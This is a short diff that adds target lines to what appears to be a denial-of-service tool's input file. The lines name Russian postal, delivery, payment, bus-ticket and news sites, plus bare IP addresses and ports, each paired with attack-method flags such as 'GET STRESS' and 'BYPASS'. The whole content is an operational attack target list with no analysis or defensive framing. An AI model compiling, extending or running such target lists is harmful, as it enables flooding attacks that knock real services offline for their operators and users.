@@ -1,1 +1,9 @@
 https://dostavista.ru https://www.delivery-club.ru/moscow https://dotochki.com https://www.pochta.ru https://podpiska.pochta.ru https://zakaznoe.pochta.ru https://otpravka.pochta.ru http://128.140.175.200:80 https://128.140.175.200:443 tcp://91.215.37.57:25 tcp://91.215.36.57:25 --http-methods GET STRESS
+
+https://62.76.145.83:443 http://62.76.145.85:8443 http://62.76.145.203:80 http://62.76.145.203:8080 tcp://62.76.145.85:8443 tcp://62.76.145.84:443 tcp://62.76.145.10:80 tcp://62.76.145.10:443 --http-methods GET STRESS
+
+https://payanyway.ru https://www.avtovokzaly.ru https://bus.tutu.ru https://185.111.86.13:443 --http-methods GET STRESS
+
+https://213.59.254.7:443 http://213.59.253.7:80 https://213.59.253.7:443 --http-methods GET STRESS
+
+https://riafan.ru --http-methods GET BYPASS STRESS
